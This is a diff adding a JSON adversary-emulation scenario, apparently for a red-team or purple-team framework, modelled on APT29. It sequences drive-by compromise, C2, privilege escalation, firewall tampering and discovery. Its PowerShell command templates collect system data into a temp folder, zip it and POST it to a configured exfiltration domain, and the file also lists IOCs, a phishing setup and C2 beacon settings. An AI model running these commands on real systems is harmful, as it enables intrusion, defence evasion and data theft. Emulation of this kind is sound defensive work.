@@ -1,0 +1,704 @@
+{
+    "meta_data": {
+        "name": "apt29",
+        "version": "v1.0.1",
+        "title": "APT-29 Inspired Scenario 1",
+        "description": "Inspired by APT29. An automated attack meant to emulate an APT actor with the common names Solorigate, SUNBURST, NobleBaron, Dark Halo, StellarParticle, NOBELIUM, UNC2452, YTTRIUM, The Dukes, Cozy Bear, CozyDuke, and APT29. The attack attempts to exfiltrate victim\u2019s data through C2 channels and alternative protocols.",
+        "author": "Attack Content",
+        "suggested_duration": 882
+    },
+    "procedures": [
+        {
+            "tactic": "Actuator",
+            "technique": "Infrastructure",
+            "label": "actuator",
+            "preconditions": {
+                "tool": "self.tool_name"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX",
+            "preconditions": {
+                "self.tool_name": "self.tool",
+                "payload": "self.payload_name",
+                "exfiltration": "self.exfil",
+                "driveby": "self.driveby",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "PayloadCheapride",
+            "technique": "Infrastructure",
+            "label": "Payload",
+            "preconditions": {
+                "tool": "self.tool"
+            }
+        },
+        {
+            "tactic": "DriveByCompromise",
+            "technique": "InitialAccess",
+            "label": "driveByCompromise",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1_low"
+            }
+        },
+        {
+            "tactic": "UserExecution",
+            "technique": "Execution",
+            "label": "userExecution",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1_low"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_1",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1_low"
+            }
+        },
+        {
+            "tactic": "ValidAccounts_LocalAccounts",
+            "technique": "PrivilegeEscalation",
+            "label": "validAccounts_LocalAccounts_t1",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "agent": "self.agent_tgt1_low",
+                "tool": "self.tool",
+                "target_1": "self.target_1_low",
+                "target_2": "self.target_1"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_1_elevated",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1",
+                "tune": {
+                    "infra": true
+                }
+            }
+        },
+        {
+            "tactic": "DisableWindowsEventLogging",
+            "technique": "DefenseEvasion",
+            "label": "disableWindowsEventLogging_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "DisableOrModifySystemFirewall",
+            "technique": "DefenseEvasion",
+            "label": "disableOrModifySystemFirewall_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{netsh advfirewall firewall add rule name=\"",
+                            {
+                                "kind": "slice",
+                                "slice": 0,
+                                "value": "self.firewall_rule_name"
+                            },
+                            "\" protocol=UDP dir=out localport=137 action=block; netsh advfirewall firewall add rule name=\"",
+                            {
+                                "kind": "slice",
+                                "slice": 1,
+                                "value": "self.firewall_rule_name"
+                            },
+                            "\" protocol=UDP dir=out localport=53 action=block}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "AutomatedCollection",
+            "technique": "Collection",
+            "label": "automatedCollection_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\",
+                            "self.temp_dir_name",
+                            "\"; mkdir $tmpfile; echo \" \"}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "SystemNetworkConfigurationDiscovery",
+            "technique": "Discovery",
+            "label": "systemNetworkConfigurationDiscovery_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{$TempFile = New-TemporaryFile; echo \"Set oReg = GetObject(\"\"winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\default:StdRegProv\"\")\" > $TempFile; echo \"Const HKCU = &H80000001\" >> $TempFile; echo \"myvar=\"\"\"\"\" >> $TempFile; echo \"' actually delete these values if present.\" >> $TempFile; echo \"if (oreg.GetStringValue(HKCU, \"\".DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\"\", \"\"AutoDetect\"\", myvar) = 0) then WScript.Echo \"\"Delete AutoDetect: = \"\" & myvar Else wscript.echo \"\"No AutoDetect\"\"\" >> $TempFile; echo \"if (oreg.GetStringValue(HKCU, \"\".DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\"\", \"\"AutoConfigURL\"\", myvar) = 0) then WScript.Echo \"\"Delete AutoConfig: = \"\" & myvar Else wscript.echo \"\"No AutoConfig\"\"\" >> $TempFile; cscript /e:VBScript $TempFile}"
+                }
+            }
+        },
+        {
+            "tactic": "SystemInformationDiscovery",
+            "technique": "Discovery",
+            "label": "systemInformationDiscovery_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\",
+                            "self.temp_dir_name",
+                            "\"; fsutil volume diskfree c: > \"$tmpfile\\disk.txt\"; echo \" \"}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "ProcessDiscovery",
+            "technique": "Discovery",
+            "label": "ProcessDiscovery_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\",
+                            "self.temp_dir_name",
+                            "\"; tasklist /v > \"$tmpfile\\task-list.txt\"; echo \" \"}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "DomainAccount",
+            "technique": "Discovery",
+            "label": "domainAccount_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\",
+                            "self.temp_dir_name",
+                            "\"; query user > \"$tmpfile\\users.txt\"; echo \" \"}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "SystemServiceDiscovery",
+            "technique": "Discovery",
+            "label": "systemServiceDiscovery_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\",
+                            "self.temp_dir_name",
+                            "\"; schtasks /query /v /fo csv > \"$tmpfile\\scheduled-tasks.txt\"; echo \" \"}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "SystemServiceDiscovery",
+            "technique": "Discovery",
+            "label": "systemServiceDiscovery_t1_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\",
+                            "self.temp_dir_name",
+                            "\"; sc.exe  query type=service state=all > \"$tmpfile\\services.txt\"; echo \" \"}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "SystemServiceDiscovery",
+            "technique": "Discovery",
+            "label": "systemServiceDiscovery_t1_3",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\",
+                            "self.temp_dir_name",
+                            "\"; wmic service get name,startname > \"$tmpdir\\services-wmi.txt\"; echo \" \"}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "ArchiveViaUtility",
+            "technique": "Collection",
+            "label": "archiveViaUtility_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\",
+                            "self.temp_dir_name",
+                            "\"; Compress-Archive -Path $tmpfile -DestinationPath \"$tmpfile.zip\"; echo \"success\" }"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "ExfiltrationOverWebService",
+            "technique": "Exfiltration",
+            "label": "exfiltrationOverWebService_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "exfil": "self.exfil",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "ExfiltrationOverWebService",
+            "technique": "Exfiltration",
+            "label": "exfiltrationOverWebService_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "exfil": "self.exfil",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $zipfile = \"C:\\users\\$username\\appdata\\local\\temp\\",
+                            "self.temp_dir_name",
+                            ".zip\"; Invoke-RestMethod -Uri ",
+                            "self.exfil_domain",
+                            "/ -Method Post -InFile $zipfile;echo \" \"}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "DisableWindowsEventLogging",
+            "technique": "DefenseEvasion",
+            "label": "disableWindowsEventLogging_t1_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{auditpol /set /category:\"Detailed Tracking\" /success:enable /failure:enable}"
+                }
+            }
+        },
+        {
+            "tactic": "DisableOrModifySystemFirewall",
+            "technique": "DefenseEvasion",
+            "label": "disableOrModifySystemFirewall_t1_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{netsh advfirewall firewall delete rule name=\"",
+                            {
+                                "kind": "slice",
+                                "slice": 0,
+                                "value": "self.firewall_rule_name"
+                            },
+                            "\"; netsh advfirewall firewall delete rule name=\"",
+                            {
+                                "kind": "slice",
+                                "slice": 1,
+                                "value": "self.firewall_rule_name"
+                            },
+                            "\"}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt1_low",
+                "tool": "self.tool",
+                "target": "self.target_1_low"
+            }
+        }
+    ],
+    "iocs": {
+        "domain": [
+            "aimsecurity.net",
+            "datazr.com",
+            "ervsystem.com",
+            "financia1market.org",
+            "ga11erycenter.org",
+            "infin1tysoftwares.com",
+            "olapdatabase.com",
+            "swipeservice.com",
+            "techiefly.com"
+        ],
+        "ip": [
+            "172.67.139.251/24",
+            "104.21.49.5/24",
+            "45.150.4.10/24",
+            "13.248.216.40/24",
+            "76.223.65.112/24",
+            "135.181.10.254/24",
+            "204.11.156.48/24",
+            "35.205.61.67/24",
+            "162.241.124.32/24",
+            "194.195.211.26/24"
+        ],
+        "binary": [
+            "WdBoot.exe",
+            "crmlog.exe",
+            "LangModel.exe",
+            "AcWin.exe",
+            "appxsig.exe",
+            "sbscmp30.exe",
+            "MainQueueOnline.exe",
+            "msbuild.exe",
+            "KerRep.exe"
+        ],
+        "temp_dir": [
+            {
+                "template": [
+                    {
+                        "kind": "call",
+                        "func": {
+                            "kind": "attribute",
+                            "attr": "join",
+                            "value": ""
+                        },
+                        "args": [
+                            {
+                                "kind": "comprehension",
+                                "element": {
+                                    "kind": "call",
+                                    "func": {
+                                        "kind": "name",
+                                        "id": "choice"
+                                    },
+                                    "args": [
+                                        {
+                                            "kind": "bin op",
+                                            "op": "add",
+                                            "left": {
+                                                "kind": "attribute",
+                                                "attr": "ascii_uppercase",
+                                                "value": {
+                                                    "kind": "name",
+                                                    "id": "string"
+                                                }
+                                            },
+                                            "right": {
+                                                "kind": "attribute",
+                                                "attr": "digits",
+                                                "value": {
+                                                    "kind": "name",
+                                                    "id": "string"
+                                                }
+                                            }
+                                        }
+                                    ]
+                                },
+                                "generators": [
+                                    {
+                                        "iter": {
+                                            "kind": "call",
+                                            "func": {
+                                                "kind": "name",
+                                                "id": "range"
+                                            },
+                                            "args": [
+                                                8
+                                            ]
+                                        },
+                                        "target": {
+                                            "kind": "name",
+                                            "id": "_"
+                                        }
+                                    }
+                                ]
+                            }
+                        ]
+                    },
+                    ".tmp"
+                ]
+            }
+        ]
+    },
+    "spec": {
+        "emaillist": "@('Janice Durham <janice.durham@site.com>', 'Darryl Richmond <darryl.richmond@site.com>', 'Nelda Rios <nelda.rios@site.com>', 'Joanna Wilkerson <joanna.wilkerson@site.com>')",
+        "tool": {
+            "1": {
+                "name": "cheapride_v1",
+                "beacon": "30",
+                "jitter": "5",
+                "ioc-ip_callback": "122.49.200.108/24",
+                "ioc-domain_callback": "inf0rm.bed1rcati.com",
+                "ioc-binary_payload_name": "form.doc.exe"
+            }
+        },
+        "chimera": {
+            "api-control_ip": "10.10.200.60"
+        },
+        "exfil": {
+            "1": {
+                "ioc-ip_exfil": "161.135.1.25/24",
+                "ioc-domain_exfil": "deepwaterhorizon.com"
+            }
+        },
+        "phishing": {
+            "1": {
+                "ioc-server_addr": "200.200.200.201",
+                "from_addr": "joanna.wilkerson@site.com",
+                "to_addrs": "Madelyn.Luna@site.com",
+                "cc": "",
+                "bcc": "",
+                "subject": "This monster is so scary!",
+                "body_subtype": "plain",
+                "attach": "",
+                "username": "joanna.wilkerson",
+                "password": "",
+                "port": "25"
+            }
+        },
+        "driveby": {
+            "1": {
+                "ioc-ip_driveby": "161.135.1.22/24",
+                "ioc-domain_driveby": "texaspumps.us"
+            }
+        },
+        "targets": {
+            "1": {
+                "payload_destination": "c:\\users\\Public",
+                "ioc-temp_dir": "temporary-files",
+                "firewall_rule_names": [
+                    "apt29-rule-1",
+                    "apt29-rule-2"
+                ]
+            }
+        }
+    },
+    "preconditions": {
+        "state": {},
+        "initial": {
+            "tool_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "name"
+                ]
+            },
+            "payload_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "ioc-binary_payload_name"
+                ]
+            },
+            "tool": {
+                "path": [
+                    "tool",
+                    "1"
+                ]
+            },
+            "exfil": {
+                "path": [
+                    "exfil",
+                    "1"
+                ]
+            },
+            "phish_1": {
+                "path": [
+                    "phishing",
+                    "1"
+                ]
+            },
+            "driveby": {
+                "path": [
+                    "driveby",
+                    "1"
+                ]
+            },
+            "driveby_domain": {
+                "path": [
+                    "driveby",
+                    "1",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "exfil_domain": {
+                "path": [
+                    "exfil",
+                    "1",
+                    "ioc-domain_exfil"
+                ]
+            },
+            "chimera": {
+                "path": [
+                    "chimera"
+                ]
+            },
+            "target_1_low": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            },
+            "target_1": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            },
+            "target_1_hostname": {
+                "path": [
+                    "targets",
+                    "1",
+                    "query-target_hostname"
+                ]
+            },
+            "temp_dir_name": {
+                "path": [
+                    "targets",
+                    "1",
+                    "ioc-temp_dir"
+                ]
+            },
+            "firewall_rule_name": {
+                "path": [
+                    "targets",
+                    "1",
+                    "firewall_rule_names"
+                ]
+            }
+        },
+        "effects": {
+            "actuator": {
+                "path": [
+                    "actuator",
+                    "actuator",
+                    "ret",
+                    "registered_id"
+                ],
+                "default": 0
+            },
+            "scenario_infrastructure": {
+                "path": [
+                    "infrastructure"
+                ]
+            },
+            "agent_tgt1_low": {
+                "path": [
+                    "webProtocols_1",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            },
+            "agent_tgt1": {
+                "path": [
+                    "webProtocols_1_elevated",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            }
+        }
+    }
+}
